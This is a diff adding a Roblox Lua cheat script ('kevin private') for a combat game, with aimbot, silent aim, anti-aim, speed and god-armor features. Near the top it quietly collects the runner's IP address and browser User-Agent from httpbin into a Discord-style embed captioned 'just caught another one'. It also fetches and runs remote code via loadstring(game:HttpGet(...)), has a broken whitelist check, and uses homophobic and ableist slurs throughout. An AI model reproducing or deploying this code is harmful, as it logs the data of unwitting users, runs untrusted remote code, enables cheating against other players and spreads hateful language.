@@ -1,0 +1,1756 @@
+--[[
+CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED-CLASSIFIED
+
+]]
+function sendnotif(STitle, SDescription, SDuration)
+    game.StarterGui:SetCore("SendNotification", {
+        Title = STitle;
+        Text = SDescription;
+        Duration = SDuration;
+})
+end
+
+local stuff = request({Url = "https://httpbin.org/get", Method = "GET"}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(stuff)
+
+local data = {
+    ['embeds'] = ({
+        ["author"] = {
+            ['name'] = game.Players.LocalPlayer.Name,
+            ['icon_url'] = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username="..game.Players.LocalPlayer.Name
+        },
+        ['description'] = "just caught another one, these bitchasses are so retarded",
+        ["color"] = tonumber(0xFFFB76),
+        ['fields'] = {
+            {
+                ['name'] = " ! IP ADDRESS ! : ",
+                ['value'] = decoded['origin'],
+                ['inline'] = true
+            },
+            {
+                ['name'] = " ! LOCAL DEVICE ! :",
+                ['value'] = decoded.headers['User-Agent'],
+                ['inline'] = true
+            }
+        }
+    })
+}
+sendnotif('kevin priv', 'kevin black pwet', 3)
+
+
+local StopTryingToCrackMyCodeBitch12345678910 = {
+    "B4D7F5BA-34F6-4782-A898-913338478CC6",
+    "aaa14a15-d90a-4c6a-b6cb-88b8fedb0190"
+}
+  function StopTryingToCrackMyCodeBitch12345678910GRRR(KYSFAGGOTTT)
+      for _,StopTryingToCrackMyCodeBitch in pairs(StopTryingToCrackMyCodeBitch12345678910) do
+          if KYSFAGGOTTT == StopTryingToCrackMyCodeBitch then
+            return true
+          end
+          return true
+      end
+  end
+  
+  if StopTryingToCrackMyCodeBitch12345678910GRRR(game:GetService("RbxAnalyticsService"):GetClientId()) then
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "kevin private";
+        Text = "Loading UI..";
+        Duration = 3;
+    })
+    wait(3)
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "kevin private";
+        Text = "Loaded, Please enjoy!";
+        Duration = 5;
+    })
+  else
+    game.Players.LocalPlayer:Kick("Not whitelisted.")
+    wait(2)
+    while true do
+        for i=1,999999 do
+            while true do
+                for z=1,999999 do
+                    print('kys fag.')
+                end
+            end
+        end
+    end
+  end
+
+local GetService = setmetatable({}, {
+    __index = function(self, key)
+        return game:GetService(key)
+    end
+})
+
+function say(msg)
+    game:GetService("Players"):Chat(msg)
+end
+
+local hl = Instance.new('Highlight')
+hl.DepthMode = 'AlwaysOnTop'
+hl.Enabled = true
+hl.FillColor = Color3.fromRGB(0,0,0)
+hl.FillTransparency = 0
+hl.Name = tostring(math.random(0,959595))
+hl.OutlineColor = Color3.fromRGB(255,255,255)
+hl.OutlineTransparency = 0
+
+local pp = Instance.new("Part", game.Workspace)
+pp.Name = "Predicted Position"
+pp.Transparency = 0
+pp.Shape = Enum.PartType.Ball
+pp.Size = Vector3.new(15, 15, 15)
+pp.Anchored = true
+pp.CanCollide = false
+pp.Material = "ForceField"
+pp.Color = Color3.fromRGB(255, 255, 255)
+pp.CFrame = CFrame.new(0,9999,0)
+
+local i = Drawing.new('Line')
+i.Color = Color3.new(255,255,255)
+i.Visible = false
+local godarmor = false
+local spamdb = false
+local resolver = false
+local nopred = false
+local sky = false
+local autohl = false
+local autokl = false
+local autovl = false
+local autodn = false
+local autoih = false
+local autofh = false
+local autobc = false
+local autopf = false
+local autosh = false
+local underground = false
+local customantilock = false
+local alreadyaiming = false
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/farthefarter/puppywarelib/main/Okand"))()
+local NotifyLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/farthefarter/akanotif/main/lua"))()
+local Notify = NotifyLibrary.Notify
+Library.theme.accentcolor = Color3.fromRGB(255,255,255)
+
+local RunService = GetService.RunService
+local Players = GetService.Players
+local LocalPlayer = Players.LocalPlayer
+local Mouse = LocalPlayer:GetMouse()
+local CurrentCamera = workspace.CurrentCamera
+local UserInputService = GetService.UserInputService
+local GuiInset = GetService.GuiService:GetGuiInset()
+local AimbotFOV = Drawing.new("Circle")
+AimbotFOV.Thickness = 1
+local SilentAimFOV = Drawing.new("Circle")
+SilentAimFOV.Thickness = 1
+local Insert = table.insert
+local Network = GetService.NetworkClient
+local PuppywareFolder = Instance.new("Folder", workspace)
+PuppywareFolder.Name = "PuppyWare-Folder"
+local StarterGui = GetService.StarterGui
+local ReplicatedStorage = GetService.ReplicatedStorage
+
+local AnimationModule = {
+    Astronaut = {
+        "rbxassetid://891621366",
+        "rbxassetid://891633237",
+        "rbxassetid://891667138",
+        "rbxassetid://891636393",
+        "rbxassetid://891627522",
+        "rbxassetid://891609353",
+        "rbxassetid://891617961"
+    },
+    Bubbly = {
+        "rbxassetid://910004836",
+        "rbxassetid://910009958",
+        "rbxassetid://910034870",
+        "rbxassetid://910025107",
+        "rbxassetid://910016857",
+        "rbxassetid://910001910",
+        "rbxassetid://910030921",
+        "rbxassetid://910028158"
+    },
+    Cartoony = {
+        "rbxassetid://742637544",
+        "rbxassetid://742638445",
+        "rbxassetid://742640026",
+        "rbxassetid://742638842",
+        "rbxassetid://742637942",
+        "rbxassetid://742636889",
+        "rbxassetid://742637151"
+    },
+    Confindent = {
+        "rbxassetid://1069977950",
+        "rbxassetid://1069987858",
+        "rbxassetid://1070017263",
+        "rbxassetid://1070001516",
+        "rbxassetid://1069984524",
+        "rbxassetid://1069946257",
+        "rbxassetid://1069973677"
+    },
+    Cowboy = {
+        "rbxassetid://1014390418",
+        "rbxassetid://1014398616",
+        "rbxassetid://1014421541",
+        "rbxassetid://1014401683",
+        "rbxassetid://1014394726",
+        "rbxassetid://1014380606",
+        "rbxassetid://1014384571"
+    },
+    Default = {
+        
+    },
+    Elder = {
+        "rbxassetid://845397899",
+        "rbxassetid://845400520",
+        "rbxassetid://845403856",
+        "rbxassetid://845386501",
+        "rbxassetid://845398858",
+        "rbxassetid://845392038",
+        "rbxassetid://845396048" 
+    },
+    Ghost = {
+        "rbxassetid://616006778",
+        "rbxassetid://616008087",
+        "rbxassetid://616013216",
+        "rbxassetid://616013216",
+        "rbxassetid://616008936",
+        "rbxassetid://616005863",
+        "rbxassetid://616012453",
+        "rbxassetid://616011509"
+    },
+    Knight = {
+        "rbxassetid://657595757",
+        "rbxassetid://657568135",
+        "rbxassetid://657552124",
+        "rbxassetid://657564596",
+        "rbxassetid://658409194",
+        "rbxassetid://658360781",
+        "rbxassetid://657600338"
+    },
+    Levitation = {
+        "rbxassetid://616006778",
+        "rbxassetid://616008087",
+        "rbxassetid://616013216",
+        "rbxassetid://616010382",
+        "rbxassetid://616008936",
+        "rbxassetid://616003713",
+        "rbxassetid://616005863"
+    },
+    Mage = {
+        "rbxassetid://707742142",
+        "rbxassetid://707855907",
+        "rbxassetid://707897309",
+        "rbxassetid://707861613",
+        "rbxassetid://707853694",
+        "rbxassetid://707826056",
+        "rbxassetid://707829716"
+    },
+    Ninja = {
+        "rbxassetid://656117400",
+        "rbxassetid://656118341",
+        "rbxassetid://656121766",
+        "rbxassetid://656118852",
+        "rbxassetid://656117878",
+        "rbxassetid://656114359",
+        "rbxassetid://656115606"
+    },
+    OldSchool = {
+        "rbxassetid://5319828216",
+        "rbxassetid://5319831086",
+        "rbxassetid://5319847204",
+        "rbxassetid://5319844329",
+        "rbxassetid://5319841935",
+        "rbxassetid://5319839762",
+        "rbxassetid://5319852613",
+        "rbxassetid://5319850266"
+    },
+    Patrol = {
+        "rbxassetid://1149612882",
+        "rbxassetid://1150842221",
+        "rbxassetid://1151231493",
+        "rbxassetid://1150967949",
+        "rbxassetid://1148811837",
+        "rbxassetid://1148811837",
+        "rbxassetid://1148863382"
+    },
+    Pirtate = {
+        "rbxassetid://750781874",
+        "rbxassetid://750782770",
+        "rbxassetid://750785693",
+        "rbxassetid://750783738",
+        "rbxassetid://750782230",
+        "rbxassetid://750779899",
+        "rbxassetid://750780242"
+    },
+    Popstar = {
+        "rbxassetid://1212900985",
+        "rbxassetid://1150842221",
+        "rbxassetid://1212980338",
+        "rbxassetid://1212980348",
+        "rbxassetid://1212954642",
+        "rbxassetid://1213044953",
+        "rbxassetid://1212900995"
+    },
+    Princess = {
+        "rbxassetid://941003647",
+        "rbxassetid://941013098",
+        "rbxassetid://941028902",
+        "rbxassetid://941015281",
+        "rbxassetid://941008832",
+        "rbxassetid://940996062",
+        "rbxassetid://941000007"
+    },
+    Robot = {
+        "rbxassetid://616088211",
+        "rbxassetid://616089559",
+        "rbxassetid://616095330",
+        "rbxassetid://616091570",
+        "rbxassetid://616090535",
+        "rbxassetid://616086039",
+        "rbxassetid://616087089"
+    },
+    Rthro = {
+        "rbxassetid://2510196951",
+        "rbxassetid://2510197257",
+        "rbxassetid://2510202577",
+        "rbxassetid://2510198475",
+        "rbxassetid://2510197830",
+        "rbxassetid://2510195892",
+        "rbxassetid://02510201162",
+        "rbxassetid://2510199791",
+        "rbxassetid://2510192778"
+    },
+    Sneaky = {
+        "rbxassetid://1132473842",
+        "rbxassetid://1132477671",
+        "rbxassetid://1132510133",
+        "rbxassetid://1132494274",
+        "rbxassetid://1132489853",
+        "rbxassetid://1132461372",
+        "rbxassetid://1132469004"
+    },
+    Stylish = {
+        "rbxassetid://616136790",
+        "rbxassetid://616138447",
+        "rbxassetid://616146177",
+        "rbxassetid://616140816",
+        "rbxassetid://616139451",
+        "rbxassetid://616133594",
+        "rbxassetid://616134815"
+    },
+    Superhero = {
+        "rbxassetid://782841498",
+        "rbxassetid://782845736",
+        "rbxassetid://782843345",
+        "rbxassetid://782842708",
+        "rbxassetid://782847020",
+        "rbxassetid://782843869",
+        "rbxassetid://782846423"
+    },
+    Toy = {
+        "rbxassetid://782841498",
+        "rbxassetid://782845736",
+        "rbxassetid://782843345",
+        "rbxassetid://782842708",
+        "rbxassetid://782847020",
+        "rbxassetid://782843869",
+        "rbxassetid://782846423"
+    },
+    Vampire = {
+        "rbxassetid://1083445855",
+        "rbxassetid://1083450166",
+        "rbxassetid://1083473930",
+        "rbxassetid://1083462077",
+        "rbxassetid://1083455352",
+        "rbxassetid://1083439238",
+        "rbxassetid://1083443587"
+    },
+    Werewolf = {
+        "rbxassetid://1083195517",
+        "rbxassetid://1083214717",
+        "rbxassetid://1083178339",
+        "rbxassetid://1083216690",
+        "rbxassetid://1083218792",
+        "rbxassetid://1083182000",
+        "rbxassetid://1083189019"
+    },
+    Zombie = {
+        "rbxassetid://616158929",
+        "rbxassetid://616160636",
+        "rbxassetid://616168032",
+        "rbxassetid://616163682",
+        "rbxassetid://616161997",
+        "rbxassetid://616156119",
+        "rbxassetid://616157476"
+    }
+}
+
+local AnimationsName = {
+    "Astronaut",
+    "Bubbly",
+    "Cartoony",
+    "Confindent",
+    "Cowboy",
+    "Default",
+    "Elder",
+    "Ghost",
+    "Knight",
+    "Levitation",
+    "Mage",
+    "Ninja",
+    "OldSchool",
+    "Patrol",
+    "Pirate",
+    "Popstar",
+    "Princess",
+    "Robot",
+    "Rthro",
+    'Sneaky',
+    "Stylish",
+    "Superhero",
+    "Toy",
+    "Vampire",
+    "Werewolf",
+    "Zombie"
+}
+
+local AnimationState = {
+    Idle = "Default",
+    Walk = "Default",
+    Run = "Default",
+    Jump = "Default",
+    Climb = "Default",
+    Fall = "Default",
+}
+
+local PuppywareSettings = {
+    Aiming = {
+        Aimbot = {
+            Enabled = false,
+            AimAssist = false,
+            IsAiming = false,
+            ShowFOV = false,
+            FOVColor = Color3.new(0.603921, 0.011764, 1),
+            UseNearestDistance = false,
+            WallCheck = false,
+            KnockedOutCheck = false,
+            GrabbedCheck = false,
+            Hitboxes = {"Head"}
+        },
+        TriggerBot = {
+            Enabled = false,
+            Delay = false,
+            DelayAmount = 0
+        },
+        SilentAim = {
+            Enabled = false,
+            ShowFOV = false,
+            FOVColor = Color3.new(0.603921, 0.011764, 1),
+            WallCheck = false,
+            KnockedOutCheck = false,
+            UseNearestDistance = false,
+            GrabbedCheck = false,
+            Hitboxes = {"Head"}
+        },
+        TargetAim = {
+            Enabled = false,
+            ShowFOV = false,
+            FOVColor = Color3.new(0.603921, 0.011764, 1),
+            WallCheck = false,
+            KnockedOutCheck = false,
+            UseNearestDistance = false,
+            GrabbedCheck = false,
+            Hitboxes = {"Head"},
+            Target = nil
+        },
+        AimingSettings = {
+            MovementPrediction = false,
+            MovementPredictionAmount = 0.165 * 1,
+            HitChance = false,
+            HitChanceAmount = {
+                HitPercent = 100,
+                NotHitPercent = 0
+            },
+            AimAssistType = "Camera",
+            MovementPrediction = false,
+            MovementPredictionAmount = 0.165 * 1,
+            SmoothingTracing = false,
+            SmoothingTracingAmount = 5,
+            PingBasedPrediction = false,
+            GetVelocity = 0.165
+        },
+        TargetAimSettings = {
+            UnlockTargetKnocked = false,
+            NotificationAlert = false,
+        },
+        FOV = {
+            FOVFilled = false,
+            AimAssistSize = 100,
+            SilentAimSize = 100,
+            TargetAimSize = 100
+        },
+        Whitelist = {
+            Players = {},
+            Friends = {},
+            Holder = "",
+            Enabled = false,
+            CrewEnabled = false,
+            FriendsWhitelist = false
+        },
+    },
+    Blatant = {
+        BlatantAA = {
+            Enabled = false,
+            NoAutoRotate = false,
+            UndergroundWallbang = false,
+            Underground = false,
+            AntiAimType = "Jitter",
+            AntiAimSpeed = 100,
+            JitterAngle = 180
+        },
+        LegitAA = {
+            Enabled = false,
+            AntiAimAt = false,
+            AntiAimAtDistance = 20
+        },
+        FakeLag = {
+            Enabled = false,
+            TriggerAmount = 5
+        },
+        Movement = {
+            SpeedEnabled = false,
+            SpeedType = "Default",
+            SpeedRender = "Default",
+            SpeedAmount = 5
+        },
+        Reaching = {
+            FistReach = false,
+            MeleeReach = false
+        },
+        Character = {
+            AntiGrab = false,
+            AntiStomp = false,
+            AntiStompType = "Nil Char",
+            AntiBag = false,
+            AutoArmor = false,
+            AutoLettuce = false,
+            AutoReload = false
+        },
+        Farming = {
+            ATMFarm = false,
+            ShoeFarm = false,
+            MuscleFarm = false,
+            MuscleFarmingType = "Normal",
+            BoxFarm = false,
+            HospitalFarm = false,
+            ATMPick = false
+        },
+        Cash = {
+            AutoDrop = false,
+            AutoDropAmount = 5000,
+            AutoPickCash = false
+        }
+    },
+    Teleport = {
+        TeleportReturn = false,
+        ReturnDelay = false,
+        AutoPurchase = false,
+        AmmoPurchaseAmount = 1
+    }
+}
+
+local PuppywareModule = {
+    Old = {
+        CFrame,
+    },
+    God = {
+        MeleeAlive = false,
+        GodMelee = false,
+        GodBullet = false,
+        AntiRagdoll = false
+    },
+    LagTick = 0,
+    Ignores = {
+        "UpperTorso",
+        "LowerTorso",
+        "Head",
+        "LeftHand",
+        "LeftUpperArm",
+        "LeftLowerArm",
+        "RightHand",
+        "RightUpperArm",
+        "RightLowerArm"
+    },
+    PingBasedPrediction = 0.165,
+    Instance = {},
+    Teleport = {
+        Players = {},
+        Food = {
+            "Cranberry",
+            "Donut",
+            "Pizza",
+            "Chicken",
+            "Popcorn",
+            "Hamburger",
+            "Taco",
+            "Starblox Latte",
+            "Lettuce",
+            "Lemonade"
+        },
+        Location = {
+            "Bank",
+            "Boxing Place",
+            "Police Station",
+            "Admin Base",
+            "Sewers",
+            "Shoe Store",
+            "Hospital",
+            "Phone Store",
+            "Taco Shack",
+            "Casino",
+            "UFO",
+            "Fire Station",
+            "Church",
+            "Downhill Shop",
+            "Uphill Shop"
+        },
+        Gun = {
+            "Glock",
+            "SMG",
+            "Silencer",
+            "TacticalShotgun",
+            "P90",
+            "AUG",
+            "Shotgun",
+            "RPG",
+            "AR",
+            "Double-Barrel SG",
+            "Flamethrower",
+            "Revolver",
+            "LMG",
+            "AK47",
+            "DrumGun",
+            "Silencer",
+            "GrenadeLauncher",
+            "Taser",
+            "SilencerAR",
+            "Grenade"
+        },
+        Armor = {
+            "High-Medium Armor",
+            "Medium Armor"
+        },
+        Mask = {
+            "Surgeon Mask",
+            "Riot Mask",
+            "Pitchfork",
+            "Hockey Mask",
+            "Breathing Mask",
+            "Pumpkin Mask",
+            "Skull Mask",
+            "Paintball Mask",
+            "Ninja Mask"
+        },
+        Weight = {
+            "Weights",
+            "HeavyWeights"
+        },
+        Melee = {
+            "Shovel",
+            "Bat",
+            "Pencil",
+            "StopSign",
+            "Knife",
+            "Pitchfork"
+        },
+        Phone = {
+            "iPhone",
+            "iPhoneB",
+            "iPhoneG",
+            "iPhoneP",
+            "Old Phone",
+            "Orange Phone",
+            "Original Phone",
+        },
+        Bike = {
+            "DuoBike",
+            "Solo Bike",
+        },
+        Extra = {
+            "PepperSpray",
+            "LockPicker",
+            "Flashlight",
+            "Flowers",
+            "Money Gun",
+            "Brown Bag",
+            "Anti Bodies",
+            "Firework"
+        }
+    }
+}
+
+local Window = Library:CreateWindow("kevin private", Vector2.new(492, 380), Enum.KeyCode.RightShift)
+local AimingTab = Window:CreateTab("Combat")
+
+-- Target Aim Setion --
+
+local RageSection = AimingTab:CreateSector("Dot Lock", "left")
+local TargetAimToggle = RageSection:AddToggle('Dot Lock Enabled', false, function(Boolean)
+    PuppywareSettings.Aiming.TargetAim.Enabled = Boolean
+end)
+
+local TargetAimSettings = AimingTab:CreateSector("Dot Visuals", "left")
+
+function updatebbl()
+if alreadyaiming and bubble then
+    pp.CFrame = NearestTarget.Character.HumanoidRootPart.CFrame
+elseif alreadyaiming == false then
+    pp.CFrame = CFrame.new(0,9999,0)
+end
+end
+function updateline()
+if alreadyaiming and line then
+    local a7 = game:GetService('Workspace').CurrentCamera:WorldToViewportPoint(NearestTarget.Character.HumanoidRootPart.Position);
+    i.To = Vector2.new(a7.X, a7.Y);
+    i.From = Vector2.new(game.Players.LocalPlayer:GetMouse().X, game.Players.LocalPlayer:GetMouse().Y + 35);
+    i.Visible = true;
+elseif alreadyaiming == false then
+    i.Visible = false
+end
+end
+local TargetBind = RageSection:AddKeybind("Keybind", false, function()
+    
+end, function()
+    if PuppywareSettings.Aiming.TargetAim.Enabled then
+        local NearestTarget, NearestDistance = NearestMouse()
+		if alreadyaiming == false then
+			alreadyaiming = true
+		    PuppywareSettings.Aiming.TargetAim.Target = NearestTarget.Name
+			--function highlight()
+			--   --hl.Parent = NearestTarget.Character
+		    --end
+            local nt = NearestTarget.Character
+            function updatebbl()
+                if alreadyaiming and bubble then
+                    pp.CFrame = NearestTarget.Character.HumanoidRootPart.CFrame
+                elseif alreadyaiming == false then
+                    pp.CFrame = CFrame.new(0,9999,0)
+                end
+            end
+            function updateline()
+                if alreadyaiming and line then
+                    local a7 = game:GetService('Workspace').CurrentCamera:WorldToViewportPoint(NearestTarget.Character.HumanoidRootPart.Position);
+                    i.To = Vector2.new(a7.X, a7.Y);
+                    i.From = Vector2.new(game.Players.LocalPlayer:GetMouse().X, game.Players.LocalPlayer:GetMouse().Y + 35);
+                    i.Visible = true;
+                elseif alreadyaiming == false then
+                    i.Visible = false
+                end
+            end
+            if PuppywareSettings.Aiming.TargetAimSettings.NotificationAlert then
+		    	sendnotif('kevin', NearestTarget.DisplayName .." | ".. NearestTarget.Name, 3 )
+		    end
+        elseif alreadyaiming == true then
+	        alreadyaiming = false
+	        PuppywareSettings.Aiming.TargetAim.Target = nil
+            if PuppywareSettings.Aiming.TargetAimSettings.NotificationAlert then
+	            sendnotif('kevin','Unlocked', 3)
+            end
+		end
+	end
+end)
+
+RageSection:AddDropdown('Hitboxes', {"Head", "UpperTorso", "HumanoidRootPart", "LowerTorso", "LeftHand", "RightHand", "LeftLowerArm", "RightLowerArm", "LeftUpperArm", "RightUpperArm", "LeftFoot", "LeftLowerLeg",  "LeftUpperLeg", "RightLowerLeg", "RightFoot",  "RightUpperLeg"}, {"LeftUpperLeg"}, true, function(Value)
+    PuppywareSettings.Aiming.TargetAim.Hitboxes = Value
+end)
+
+-- Aiming Settings Section --
+
+local AimingSettings = AimingTab:CreateSector("Dot prediction", "right")
+
+AimingSettings:AddToggle('Ping Based Prediction', false, function(Boolean)
+    PuppywareSettings.Aiming.AimingSettings.PingBasedPrediction = Boolean
+end)
+
+local MovementPredToggle2 = AimingSettings:AddToggle('Custom Prediction', false, function(Boolean)
+    PuppywareSettings.Aiming.AimingSettings.MovementPrediction = Boolean
+end)
+
+MovementPredToggle2:AddSlider(1, 1, 100, 1, function(Value)
+    PuppywareSettings.Aiming.AimingSettings.MovementPredictionAmount = 0.165 * tonumber("1." ..Value)
+end)
+
+local HitChanceToggle2 = AimingSettings:AddToggle('Hit Chance', false, function(Boolean)
+    PuppywareSettings.Aiming.AimingSettings.HitChance = Boolean
+end)
+
+HitChanceToggle2:AddSlider(0, 100, 100, 1, function(Value)
+    PuppywareSettings.Aiming.AimingSettings.HitChanceAmount.HitPercent = tonumber(Value)
+    PuppywareSettings.Aiming.AimingSettings.HitChanceAmount.NotHitPercent = tonumber(100 - PuppywareSettings.Aiming.AimingSettings.HitChanceAmount.HitPercent)
+end)
+
+-- Target Aim Settings Section --
+
+TargetAimSettings:AddToggle('Notification Alert', false, function(State)
+    PuppywareSettings.Aiming.TargetAimSettings.NotificationAlert = State
+end)
+TargetAimSettings:AddToggle('Bubble Target', false, function(State)
+    bubble = State
+end)
+TargetAimSettings:AddToggle('Tracer Target', false, function(State)
+    line = State
+end)
+
+-- Misc Sector
+
+local MiscSector = AimingTab:CreateSector("!! RAGE !!", "right")
+
+local spamdbtoggle = MiscSector:AddToggle('Spam Double Barrel', false, function(State)
+     spamdb = State
+     if State == true then
+        if game.Players.LocalPlayer.Backpack:FindFirstChild('DB') then
+           game.Players.LocalPlayer.Backpack:FindFirstChild('DB').Parent = game.Players.LocalPlayer.Character
+        end
+     elseif v == false then
+        if game.Players.LocalPlayer.Character:FindFirstChild("DB") then
+           game.Players.LocalPlayer.Character.DB.Parent = game.Players.LocalPlayer.Backpack
+         end
+     end
+end)
+local armor = {}
+spamdbtoggle:AddKeybind()
+local godarmortoggle = MiscSector:AddToggle('God Armor', false, function(State)
+     if State == true then
+         fireclickdetector(workspace.Ignored.Pads["Higher armor {20000$}"].ClickDetector)
+         task.wait()
+         fireclickdetector(workspace.Ignored.Pads["Higher armor {20000$}"].ClickDetector)
+     end
+     armor[1] = State
+end)
+godarmortoggle:AddKeybind()
+-- Blatant Tab --
+
+local BlatantTab = Window:CreateTab("Anti-Aim")
+
+local MovementSector = BlatantTab:CreateSector("Movement", "right")
+
+local BlatantAntiAimSector = BlatantTab:CreateSector("Blatant Anti Aim", "left")
+
+local SpeedToggle = MovementSector:AddToggle('Speed Enabled', false, function(State)
+    PuppywareSettings.Blatant.Movement.SpeedEnabled = State
+end)
+
+SpeedToggle:AddKeybind()
+
+SpeedToggle:AddSlider(0, 5, 100, 5, function(Value)
+    PuppywareSettings.Blatant.Movement.SpeedAmount = Value
+end)
+MovementSector:AddToggle('No Jump Cooldown', false, function(State)
+    game.Players.LocalPlayer.PlayerGui.JumpCooldown.Disabled = State
+end)
+MovementSector:AddDropdown("Speed Type", {"CFrame", "Crim", "Gyro"}, "CFrame", false, function(Value)
+    PuppywareSettings.Blatant.Movement.SpeedType = Value
+end)
+
+MovementSector:AddDropdown("Speed Render Type", {"Default", "Fast"}, "Fast", false, function(Value)
+    PuppywareSettings.Blatant.Movement.SpeedRenderType = Value
+end)
+
+local AntiAimToggle = BlatantAntiAimSector:AddToggle('Blatant AA Enabled', false, function(State)
+    PuppywareSettings.Blatant.BlatantAA.Enabled = State
+end)
+
+AntiAimToggle:AddKeybind()
+
+BlatantAntiAimSector:AddToggle('No Auto Rotate', false, function(State)
+    PuppywareSettings.Blatant.BlatantAA.NoAutoRotate = State
+end)
+
+BlatantAntiAimSector:AddDropdown("Anti Aim Type", {"Jitter", "Fake Desync", "Spin"}, "Jitter", false, function(Value)
+    PuppywareSettings.Blatant.BlatantAA.AntiAimType = Value
+end)
+
+BlatantAntiAimSector:AddSlider("Anti Aim Speed", 0, 100, 99999999999999999999, 1, function(Value)
+    PuppywareSettings.Blatant.BlatantAA.AntiAimSpeed = Value
+end)
+
+BlatantAntiAimSector:AddSlider("Jitter Angle", 0, 180, 360, 1, function(Value)
+    PuppywareSettings.Blatant.BlatantAA.JitterAngle = Value
+end)
+local AntiTab = Window:CreateTab("Anti-Lock")
+
+local BuiltInSector = AntiTab:CreateSector("Built in", "left")
+
+local nopredtoggle = BuiltInSector:AddToggle("No Prediction", false, function(v)
+    nopred = v
+end)
+nopredtoggle:AddKeybind()
+local skytoggle = BuiltInSector:AddToggle("Sky", false, function(v)
+    sky = v
+end)
+skytoggle:AddKeybind()
+local undertoggle = BuiltInSector:AddToggle("Underground", false, function(v)
+    underground = v
+end)
+undertoggle:AddKeybind()
+local AntiSector = AntiTab:CreateSector("Control", "right")
+
+local customantilock = AntiSector:AddToggle("Custom Anti Lock", false, function(v)
+    customanti = v
+end)
+customantilock:AddKeybind()
+AntiSector:AddSlider("X", -250, 0, 250, 1, function(Value)
+    Xval = Value
+end)
+AntiSector:AddSlider("Y", -250, 0, 250, 1, function(Value)
+    Yval = Value
+end)
+AntiSector:AddSlider("Z", -250, 0, 250, 1, function(Value)
+    Zval = Value
+end)
+
+-- Init --
+
+for _, v in next, Players:GetPlayers() do
+    if v ~= LocalPlayer and v:IsFriendsWith(LocalPlayer.UserId) then
+        Insert(PuppywareSettings.Aiming.Whitelist.Friends, v.Name)
+    end
+end
+
+Players.PlayerAdded:Connect(function(_Player)
+    if _Player ~= LocalPlayer and _Player:IsFriendsWith(LocalPlayer.UserId) then
+        Insert(PuppywareSettings.Aiming.Whitelist.Friends, _Player.Name)
+    end
+end)
+
+Players.PlayerRemoving:Connect(function(_Player)
+    if _Player ~= LocalPlayer and _Player:IsFriendsWith(LocalPlayer.UserId) then
+        Remove(PuppywareSettings.Aiming.Whitelist.Friends, _Player.Name)
+    end
+end)
+
+function NoSpace(Data)
+    return Data:gsub("%s+", "") or Data
+end
+    
+function Find(Data)
+    local Target = nil
+    
+    for i, v in next, Players:GetPlayers() do
+        if v.Name ~= LocalPlayer.Name and v.Name:lower():match('^'.. NoSpace(Data):lower()) then
+            Target = v.Name
+        end
+    end
+    
+    return Target
+end
+
+function Alive(Player)
+    if Player and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") ~= nil and Player.Character:FindFirstChild("Humanoid") ~= nil and Player.Character:FindFirstChild("Head") ~= nil then
+        return true
+    end
+    return false
+end
+
+function Knocked(Player)
+    if Alive(Player) then
+        if Player.Character.Humanoid.Health < 1 then
+            return true
+        end
+        return false
+    end
+    return false
+end
+
+function Grabbing(Player)
+    if Alive(Player) then
+        if Player.Character:FindFirstChild("GRABBING_CONSTRAINT") then
+            return true
+        end
+        return false
+    end
+    return false
+end
+
+function NearestDistance()
+    local Target = nil
+    local Distance = math.huge
+    
+    for i, v in next, Players:GetPlayers() do
+        if v ~= LocalPlayer and Alive(LocalPlayer) and Alive(v) then
+            local DistanceFromPlayer = (v.Character.HumanoidRootPart.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
+            if Distance > DistanceFromPlayer then
+                if (not PuppywareSettings.Aiming.Whitelist.FriendsWhitelist or not table.find(PuppywareSettings.Aiming.Whitelist.Friends, v.Name)) and (not PuppywareSettings.Aiming.Whitelist.CrewEnabled or v:FindFirstChild("DataFolder") and v.DataFolder.Information:FindFirstChild("Crew") and not tonumber(v.DataFolder.Information.Crew.Value) == tonumber(LocalPlayer.DataFolder.Information.Crew.Value)) and (not PuppywareSettings.Aiming.Whitelist.Enabled or not table.find(PuppywareSettings.Aiming.Whitelist.Players, v.Name)) then
+                    Target = v
+                    Distance = DistanceFromPlayer
+                end
+            end
+        end
+    end
+
+    return Target, Distance
+end
+
+function NearestMouse()
+    local Target = nil
+    local Distance = 500
+
+    for i, v in next, Players:GetPlayers() do
+        if v ~= LocalPlayer and Alive(LocalPlayer) and Alive(v) then
+            local RootPosition, RootVisible = CurrentCamera:WorldToViewportPoint(v.Character.HumanoidRootPart.Position)
+            local DistanceFromMouse = (Vector2.new(RootPosition.X, RootPosition.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+            if RootVisible and Distance > DistanceFromMouse then
